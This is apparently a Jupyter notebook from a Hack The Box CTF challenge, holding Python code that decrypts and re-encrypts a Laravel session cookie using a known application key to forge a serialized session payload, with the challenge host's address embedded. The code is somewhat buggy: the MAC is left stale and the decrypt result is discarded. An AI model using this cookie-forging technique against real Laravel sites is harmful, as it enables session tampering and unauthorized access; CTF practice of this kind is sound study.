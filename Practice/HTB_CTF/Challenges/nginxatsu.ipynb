{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{'iv': 'cZsNTA2aEew4u11x8xGoXA==', 'value': 'iUnMYX4XU8Ldf+AYccRFV+v3gA8rRlKlfkK6GwAquKhjK70DrTMDubP41VnoCRW88X33c9CLCEgodF8mjM4AkeU3D0hOYJmXab8abv/0oigmO6PAbb+rms+ppdk89UVtnlOcx+/HG5YYYu9ICQ3KoO8dxrg0bWzfBDbBj8DUF0rLv4P3KrTEuTYE0scQ06jeauswBkeEmWUT2N/+Rr1iSvnzB5kGxhCDlkDu5xLwjPrrhlY7hInOntbRYYqK/9r6FWavCJGDVzKaDNb7zcr7vNDMNifSXI/NXDSSsGiLlp2OeV6C2e+/4PZQjbOjSU9uRjP6E6R2N3+qxzrPKLEwUTGQlWxY33QdOVBWDgbQO4fhddwFXaU/rfgX2qHPxciGFtubXmwhj5jr//aqNQW4PZzh6eHt+d+q3pB5rwNa2g0Sx6ZTZuVqjbm0+he+BBe5wxQcWZWKolazS7BwZVk4DA==', 'mac': 'db9e4da4bb9278112617b97b5b280f32cde9b0968c6a4898a7c38bf44a8464f0'}\n",
      "{'iv': 'cZsNTA2aEew4u11x8xGoXA==', 'value': 'iUnMYX4XU8Ldf+AYccRFV+v3gA8rRlKlfkK6GwAquKhjK70DrTMDubP41VnoCRW88X33c9CLCEgodF8mjM4AkeU3D0hOYJmXab8abv/0oigmO6PAbb+rms+ppdk89UVtnlOcx+/HG5YYYu9ICQ3KoO8dxrg0bWzfBDbBj8DUF0rLv4P3KrTEuTYE0scQ06jeauswBkeEmWUT2N/+Rr1iSvnzB5kGxhCDlkDu5xLwjPrrhlY7hInOntbRYYqK/9r6FWavCJGDVzKaDNb7zcr7vNDMNifSXI/NXDSSsGiLlp2OeV6C2e+/4PZQjbOjSU9uRjP6E6R2N3+qxzrPKLEwUTGQlWxY33QdOVBWDgbQO4fhddwFXaU/rfgX2qHPxciGFtubXmwhj5jr//aqNQW4PZzh6eHt+d+q3pB5rwNa2g0Sx6ZTZuVqjbm0+he+BBe5wxQcWZWKolazS7BwZVk4DA==', 'mac': 'db9e4da4bb9278112617b97b5b280f32cde9b0968c6a4898a7c38bf44a8464f0'}\n"
     ]
    }
   ],
   "source": [
    "from Crypto.Cipher import AES\n",
    "import base64\n",
    "import json\n",
    "import urllib.parse\n",
    "from Crypto.Util.Padding import pad, unpad\n",
    "from phpserialize import unserialize\n",
    "\n",
    "\n",
    "KEY = \"cgxs+3SOT4QBcNDUWBOA5/FoS/Tao9k5y2vHTP3lP0E=\"\n",
    "COOKIE = \"eyJpdiI6ImNac05UQTJhRWV3NHUxMXg4eEdvWEE9PSIsInZhbHVlIjoiaVVuTVlYNFhVOExkZitBWWNjUkZWK3YzZ0E4clJsS2xma0s2R3dBcXVLaGpLNzBEclRNRHViUDQxVm5vQ1JXODhYMzNjOUNMQ0Vnb2RGOG1qTTRBa2VVM0QwaE9ZSm1YYWI4YWJ2XC8wb2lnbU82UEFiYitybXMrcHBkazg5VVZ0bmxPY3grXC9IRzVZWVl1OUlDUTNLb084ZHhyZzBiV3pmQkRiQmo4RFVGMHJMdjRQM0tyVEV1VFlFMHNjUTA2amVhdXN3QmtlRW1XVVQyTlwvK1JyMWlTdm56QjVrR3hoQ0Rsa0R1NXhMd2pQcnJobFk3aEluT250YlJZWXFLXC85cjZGV2F2Q0pHRFZ6S2FETmI3emNyN3ZORE1OaWZTWElcL05YRFNTc0dpTGxwMk9lVjZDMmUrXC80UFpRamJPalNVOXVSalA2RTZSMk4zK3F4enJQS0xFd1VUR1FsV3hZMzNRZE9WQldEZ2JRTzRmaGRkd0ZYYVVcL3JmZ1gycUhQeGNpR0Z0dWJYbXdoajVqclwvXC9hcU5RVzRQWnpoNmVIdCtkK3EzcEI1cndOYTJnMFN4NlpUWnVWcWpibTAraGUrQkJlNXd4UWNXWldLb2xhelM3QndaVms0REE9PSIsIm1hYyI6ImRiOWU0ZGE0YmI5Mjc4MTEyNjE3Yjk3YjViMjgwZjMyY2RlOWIwOTY4YzZhNDg5OGE3YzM4YmY0NGE4NDY0ZjAifQ%3D%3D\"\n",
    "\n",
    "\n",
    "class Laravel:\n",
    "    def __init__(cls, key, cookie):\n",
    "        cls.key = base64.b64decode(key)\n",
    "        cls.cookie = json.loads(base64.b64decode(urllib.parse.unquote_plus(cookie)))\n",
    "\n",
    "    def decrypt_value(cls:str) -> str:\n",
    "        decoded_text = cls.cookie\n",
    "        iv = base64.b64decode(decoded_text['iv'])\n",
    "\n",
    "        crypt_object = AES.new(key=cls.key, mode=AES.MODE_CBC, IV=iv)\n",
    "\n",
    "        decoded = base64.b64decode(decoded_text['value'])\n",
    "        decrypted = unpad(crypt_object.decrypt(decoded), len(decoded)).decode()\n",
    "        # decoded_text['value'] = decrypted\n",
    "        return decoded_text\n",
    "\n",
    "    def encrypt_value(cls:str, toappend:str) -> str:\n",
    "        decoded_text = cls.cookie\n",
    "        iv = base64.b64decode(decoded_text['iv'])\n",
    "\n",
    "        crypt_object = AES.new(key=cls.key, mode=AES.MODE_CBC, IV=iv)\n",
    "\n",
    "        encoded = toappend\n",
    "        encrypted = crypt_object.encrypt(pad(encoded.encode(), AES.block_size))\n",
    "        decoded_text['value'] = base64.b64encode(encrypted).decode()\n",
    "        return decoded_text\n",
    "    \n",
    "\n",
    "\n",
    "lar = Laravel(KEY, COOKIE)\n",
    "print(lar.encrypt_value('{\"data\":\"a:6:{s:6:\\\\\"_token\\\\\";s:40:\\\\\"6UPBQnItOzWold6wDWTf5wjvPAfEuvDkbXiCFxCo\\\\\";s:8:\\\\\"username\\\\\";s:8:\\\\\"guestc0c\\\\\";s:5:\\\\\"order\\\\\";s:2:\\\\\"id\\\\\";s:9:\\\\\"direction\\\\\";s:4:\\\\\"desc\\\\\";s:6:\\\\\"_flash\\\\\";a:2:{s:3:\\\\\"old\\\\\";a:0:{}s:3:\\\\\"new\\\\\";a:0:{}}s:9:\\\\\"_previous\\\\\";a:1:{s:3:\\\\\"url\\\\\";s:38:\\\\\"http:\\\\/\\\\/178.62.104.23:32721\\\\/api\\\\/configs\\\\\";}}\",\"expires\":1658373563}'))\n",
    "lar = Laravel(KEY, COOKIE)\n",
    "print(lar.decrypt_value())"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3.10.4 64-bit",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.4"
  },
  "orig_nbformat": 4,
  "vscode": {
   "interpreter": {
    "hash": "e7370f93d1d0cde622a1f8e1c04877d8463912d04d973331ad4851f04de6915a"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
